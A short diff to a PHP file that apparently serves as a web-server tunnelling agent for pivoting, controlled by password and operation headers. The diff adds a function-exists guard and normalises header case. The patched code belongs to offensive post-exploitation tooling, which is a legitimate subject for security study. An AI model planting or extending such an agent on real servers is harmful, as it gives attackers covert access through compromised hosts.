@@ -2,7 +2,9 @@
 
 ini_set("allow_url_fopen", true);
 ini_set("allow_url_include", true);
-apache_setenv('no-gzip', 1);
+if (function_exists('apache_setenv')) {
+    apache_setenv('no-gzip', 1);
+}
 error_reporting(E_ERROR | E_PARSE);
 
 if( !function_exists('apache_request_headers') ) {
@@ -65,7 +67,8 @@ function main() {
         $RECV_OPERATION, $SEND_OPERATION, $ID_HEADER, $PASSWORD_HEADER, $AGENT_PASSWORD;
 
     set_time_limit(0);
-	$headers=apache_request_headers();
+    $headers=apache_request_headers();
+    $headers=array_change_key_case($headers, CASE_UPPER);
 	$cmd = $headers[$OPERATION_HEADER];
     $password = $headers[$PASSWORD_HEADER];
 
